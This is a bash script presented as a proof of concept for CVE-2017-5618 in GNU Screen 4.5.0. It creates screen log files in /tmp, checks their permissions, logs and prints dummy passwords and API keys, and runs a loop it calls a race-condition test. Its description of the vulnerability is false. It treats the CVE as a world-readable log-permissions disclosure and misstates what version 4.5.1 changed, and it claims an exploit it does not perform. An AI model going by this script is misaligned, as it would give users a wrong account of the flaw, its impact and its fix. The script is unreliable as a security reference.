#!/bin/bash
#
# CVE-2017-5618 - GNU Screen Logfile Permissions Vulnerability PoC
# ================================================================
#
# This script demonstrates the logfile permissions vulnerability in GNU Screen 4.5.0.
# The vulnerability occurs when using the -L option with a filename argument.
#

echo "================================================================"
echo "CVE-2017-5618 - GNU Screen Logfile Permissions Vulnerability"
echo "================================================================"
echo

# Check screen version
echo "[*] Checking GNU Screen version..."
screen -v
echo

# Test 1: Basic logfile creation vulnerability
echo "[*] Test 1: Basic logfile creation with -L option"
echo "------------------------------------------------"

LOGFILE="/tmp/screen_test_log_$$"
echo "[*] Creating logfile: $LOGFILE"

# Remove any existing file
rm -f "$LOGFILE"

# Use the vulnerable -L option
echo "[*] Executing: screen -L $LOGFILE -d -m echo 'test session'"
screen -L "$LOGFILE" -d -m echo "test session"

# Wait a moment
sleep 2

# Check if file was created and examine permissions
if [ -f "$LOGFILE" ]; then
    echo "[+] Logfile created successfully!"
    echo "[+] File permissions:"
    ls -la "$LOGFILE"
    
    # Check file permissions in detail
    PERMS=$(stat -c "%a" "$LOGFILE" 2>/dev/null)
    echo "[+] Octal permissions: $PERMS"
    
    # Check if file is readable by others
    if [ -r "$LOGFILE" ]; then
        echo "[+] File is readable by current user"
        echo "[+] File contents:"
        cat "$LOGFILE" 2>/dev/null || echo "[!] Could not read file contents"
    else
        echo "[!] File is not readable by current user"
    fi
    
    # Check world-readable permissions
    if [ "${PERMS:2:1}" -ge "4" ]; then
        echo "[!] VULNERABILITY: File is world-readable!"
    fi
    
    rm -f "$LOGFILE"
else
    echo "[!] Logfile was not created"
fi

echo

# Test 2: Information disclosure scenario
echo "[*] Test 2: Information disclosure scenario"
echo "-------------------------------------------"

SENSITIVE_LOG="/tmp/sensitive_screen_log_$$"
echo "[*] Creating screen session with sensitive information..."

# Create a session that logs sensitive data
screen -L "$SENSITIVE_LOG" -d -m bash -c "
echo 'Starting sensitive session...'
echo 'Username: admin'
echo 'Password: secret123'
echo 'API Key: abc123xyz789'
echo 'Database connection: mysql://user:pass@localhost/db'
sleep 1
echo 'Session complete'
"

# Wait for session to complete
sleep 3

if [ -f "$SENSITIVE_LOG" ]; then
    echo "[+] Sensitive logfile created: $SENSITIVE_LOG"
    echo "[+] File permissions:"
    ls -la "$SENSITIVE_LOG"
    
    echo "[+] Checking for sensitive information exposure..."
    if grep -q "Password:\|API Key:\|mysql://" "$SENSITIVE_LOG" 2>/dev/null; then
        echo "[!] CRITICAL: Sensitive information found in logfile!"
        echo "[!] Exposed content:"
        echo "----------------------------------------"
        cat "$SENSITIVE_LOG" 2>/dev/null
        echo "----------------------------------------"
    else
        echo "[*] No sensitive information detected in logfile"
    fi
    
    rm -f "$SENSITIVE_LOG"
else
    echo "[!] Sensitive logfile was not created"
fi

echo

# Test 3: Race condition demonstration
echo "[*] Test 3: Race condition timing demonstration"
echo "-----------------------------------------------"

RACE_LOG="/tmp/race_condition_log_$$"
echo "[*] Demonstrating race condition window..."

# Monitor file creation in background
(
    while [ ! -f "$RACE_LOG" ]; do
        sleep 0.01
    done
    echo "[+] File detected during creation!"
    ls -la "$RACE_LOG" 2>/dev/null
) &

MONITOR_PID=$!

# Trigger file creation
screen -L "$RACE_LOG" -d -m echo "race condition test"

# Wait for monitor to finish
sleep 2
kill $MONITOR_PID 2>/dev/null

if [ -f "$RACE_LOG" ]; then
    rm -f "$RACE_LOG"
fi

echo

# Summary
echo "================================================================"
echo "VULNERABILITY SUMMARY"
echo "================================================================"
echo
echo "[*] CVE-2017-5618 affects GNU Screen 4.5.0"
echo "[*] The -L option creates logfiles with potentially insecure permissions"
echo "[*] This can lead to information disclosure of terminal sessions"
echo "[*] Sensitive data (passwords, keys, etc.) may be exposed"
echo
echo "[*] MITIGATION: Upgrade to GNU Screen 4.5.1 or later"
echo "[*] In 4.5.1, the -L option was changed to -Logfile with better validation"
echo

echo "Exploit completed."